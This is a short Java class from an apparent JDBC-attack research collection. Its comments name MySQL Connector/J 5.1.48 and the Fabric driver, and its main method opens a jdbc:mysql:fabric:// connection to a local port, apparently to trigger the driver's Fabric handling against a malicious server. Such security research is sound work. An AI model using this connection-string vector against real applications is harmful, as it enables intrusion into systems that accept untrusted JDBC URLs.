package org.su18.jdbc.attack.mysql.fabric;

import java.sql.DriverManager;

/**
 * 依赖版本 5.1.48
 * 驱动名称 com.mysql.fabric.jdbc.FabricMySQLDriver
 * 属性名 fabric
 * 连接参数 fabric://127.0.0.1:5000
 *
 * @author su18
 */
public class AttackFabric {

	public static void main(String[] args) throws Exception {

		// 可以不指定 driver，使用 SPI 机制分配 FabricMySQLDriver
		String url = "jdbc:mysql:fabric://127.0.0.1:5000";

		DriverManager.getConnection(url);
	}

}
